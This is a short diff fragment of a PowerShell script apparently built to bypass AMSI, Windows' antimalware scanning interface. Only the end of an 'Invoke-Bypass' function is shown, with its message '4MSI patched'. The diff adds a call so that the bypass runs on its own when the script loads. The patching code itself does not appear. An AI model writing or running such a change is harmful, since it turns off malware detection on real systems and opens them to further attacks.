@@ -196,3 +196,5 @@ function Invoke-Bypass {
     }
     Write-Host "[*] Successful providers patching, 4MSI patched" -ForegroundColor Green
 }
+Invoke-Bypass
+
